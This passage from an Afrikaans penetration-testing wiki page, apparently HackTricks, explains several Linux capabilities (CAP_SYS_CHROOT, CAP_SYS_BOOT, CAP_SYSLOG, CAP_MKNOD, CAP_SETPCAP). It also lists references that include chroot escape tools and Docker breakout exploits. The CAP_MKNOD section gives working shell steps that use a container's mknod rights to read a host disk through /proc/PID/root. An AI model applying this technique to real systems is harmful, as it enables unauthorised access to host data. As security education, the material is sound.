[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) maak die uitvoering van die `chroot(2)` system call moontlik, wat potensieel die ontsnapping uit `chroot(2)`-omgewings deur bekende vulnerabilities kan toelaat:<sup>[[11]](#references)</sup>

- [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)<sup>[[11]](#references)</sup>
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) laat nie net die uitvoering van die `reboot(2)` system call vir system restarts toe, insluitend spesifieke commands soos `LINUX_REBOOT_CMD_RESTART2` wat vir sekere hardware platforms aangepas is nie, maar maak ook die gebruik van `kexec_load(2)` en, vanaf Linux 3.17, `kexec_file_load(2)` moontlik om onderskeidelik nuwe of signed crash kernels te laai.

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) is in Linux 2.6.37 van die breër **CAP_SYS_ADMIN** geskei en verleen spesifiek die vermoë om die `syslog(2)` call te gebruik. Hierdie capability maak dit moontlik om kernel addresses deur middel van `/proc` en soortgelyke interfaces te sien wanneer die `kptr_restrict`-setting op 1 gestel is, wat die blootstelling van kernel addresses beheer. Sedert Linux 2.6.39 is die default vir `kptr_restrict` 0, wat beteken dat kernel addresses blootgestel word, hoewel baie distributions dit vir security reasons op 1 stel (verberg addresses behalwe van uid 0) of op 2 (verberg addresses altyd).

Daarbenewens laat **CAP_SYSLOG** toegang tot `dmesg` output toe wanneer `dmesg_restrict` op 1 gestel is. Ten spyte van hierdie veranderinge behou **CAP_SYS_ADMIN** die vermoë om `syslog` operations uit te voer weens historiese precedents.

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) brei die funksionaliteit van die `mknod` system call uit tot meer as net die skep van regular files, FIFOs (named pipes) of UNIX domain sockets. Dit laat spesifiek die skep van special files toe, wat die volgende insluit:

- **S_IFCHR**: Character special files, wat devices soos terminals is.
- **S_IFBLK**: Block special files, wat devices soos disks is.

Hierdie capability is noodsaaklik vir processes wat die vermoë benodig om device files te skep, wat direkte hardware interaction deur character- of block devices fasiliteer.

Dit is 'n default docker capability ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

Hierdie capability laat privilege escalations (deur full disk read) op die host toe, onder die volgende conditions:<sup>[[7]](#references)</sup>

1. Het aanvanklike toegang tot die host (Unprivileged).
2. Het aanvanklike toegang tot die container (Privileged (EUID 0), en effective `CAP_MKNOD`).
3. Host en container moet dieselfde user namespace deel.

**Stappe om 'n Block Device in 'n Container te Skep en Toegang daartoe te Verkry:**

1. **Op die Host as 'n Standard User:**

- Bepaal jou huidige user ID met `id`, byvoorbeeld `uid=1000(standarduser)`.
- Identifiseer die target device, byvoorbeeld `/dev/sdb`.

2. **Binne die Container as `root`:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **Terug op die Host:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
Hierdie benadering stel die gewone gebruiker in staat om toegang tot en moontlik data vanaf `/dev/sdb` deur die container te lees, deur gedeelde user namespaces en toestemmings wat op die device gestel is, uit te buit.

### CAP_SETPCAP

**CAP_SETPCAP** stel ’n proses in staat om die **capability sets** van ’n ander proses te verander, wat die byvoeging of verwydering van capabilities uit die effective, inheritable en permitted sets moontlik maak. ’n Proses kan egter slegs capabilities wysig wat dit in sy eie permitted set besit, wat verseker dat dit nie ’n ander proses se privileges bo sy eie kan verhoog nie. Onlangse kernel-opdaterings het hierdie reëls verskerp en `CAP_SETPCAP` beperk om slegs die capabilities binne sy eie of sy afstammelinge se permitted sets te verminder, met die doel om security risks te beperk. Gebruik vereis dat `CAP_SETPCAP` in die effective set en die teiken-capabilities in die permitted set is, met gebruik van `capset()` vir wysigings. Dit som die kernfunksie en beperkings van `CAP_SETPCAP` op en beklemtoon die rol daarvan in privilege management en security enhancement.

**`CAP_SETPCAP`** is ’n Linux capability wat ’n proses toelaat om die **capability sets van ’n ander proses te wysig**. Dit verleen die vermoë om capabilities uit die effective, inheritable en permitted capability sets van ander prosesse by te voeg of te verwyder. Daar is egter sekere beperkings op hoe hierdie capability gebruik kan word.

’n Proses met `CAP_SETPCAP` **kan slegs capabilities toestaan of verwyder wat in sy eie permitted capability set is**. Met ander woorde, ’n proses kan nie ’n capability aan ’n ander proses toestaan as dit nie self daardie capability het nie. Hierdie beperking voorkom dat ’n proses die privileges van ’n ander proses bo sy eie privilege level verhoog.

Boonop is die `CAP_SETPCAP` capability in onlangse kernel-weergawes **verder beperk**. Dit laat ’n proses nie meer toe om die capability sets van ander prosesse arbitrêr te wysig nie. In plaas daarvan **laat dit slegs toe dat ’n proses die capabilities in sy eie permitted capability set of die permitted capability set van sy afstammelinge verlaag**. Hierdie verandering is ingestel om potensiële security risks wat met die capability verband hou, te verminder.

Om `CAP_SETPCAP` effektief te gebruik, moet jy die capability in jou effective capability set hê, asook die teiken-capabilities in jou permitted capability set. Jy kan dan die `capset()` system call gebruik om die capability sets van ander prosesse te wysig.

Samevattend laat `CAP_SETPCAP` ’n proses toe om die capability sets van ander prosesse te wysig, maar dit kan nie capabilities toestaan wat dit nie self het nie. Weens security concerns is die funksionaliteit daarvan in onlangse kernel-weergawes ook beperk om slegs die capabilities in sy eie permitted capability set of die permitted capability sets van sy afstammelinge te verminder.

## Verwysings

- [1] [AttackDefense (Pentester Academy) - Linux capabilities privilege escalation labs](https://attackdefense.pentesteracademy.com)
- [2] [Hacker's Grimoire - Privilege Escalation Linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [3] [Linux Container Basics: Capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [4] [Linux capabilities 101](https://linux-audit.com/linux-capabilities-101/)
- [5] [Taking Advantage of Linux Capabilities](https://www.linuxjournal.com/article/5737)
- [6] [Excessive Capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [7] [WithSecure Labs: Abusing the access to mount namespaces through /proc/pid/root](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)
- [8] [Linux Capabilities: Why They Exist and How They Work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [9] [Understanding Capabilities in Linux](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [10] [PoC for bypassing seccomp if ptrace is allowed](https://gist.github.com/thejh/8346f47e359adecd1d53)
- [11] [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [12] [shocker.c - original CAP_DAC_READ_SEARCH Docker breakout exploit by Sebastian Krahmer](http://stealth.openwall.net/xSports/shocker.c)
- [13] [Docker breakout exploit analysis](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)

{{#include ../../banners/hacktricks-training.md}}
